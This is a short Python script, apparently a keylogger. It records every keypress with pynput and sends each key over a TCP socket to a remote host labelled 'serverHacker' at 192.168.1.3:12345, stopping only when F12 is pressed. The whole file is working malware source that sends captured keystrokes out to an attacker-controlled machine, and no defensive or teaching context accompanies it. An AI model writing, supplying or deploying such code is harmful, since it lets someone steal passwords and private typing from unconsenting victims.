from  pynput.keyboard import Listener
import socket

clientSocket = socket.socket( socket.AF_INET, socket.SOCK_STREAM)

serverHacker = '192.168.1.3'
serverPort = 12345
clientSocket.connect((serverHacker, serverPort))
print (clientSocket.recv(1024).decode())

def on_press(key):
    key = str(key)
    key = key.replace("'", "")
    if key == "Key.f12":
        raise SystemExit(0)
    clientSocket.send(key.encode('utf-8')) #mã hóa key thành dạng byte


with  Listener(on_press =  on_press) as hacker:         
    hacker.join()

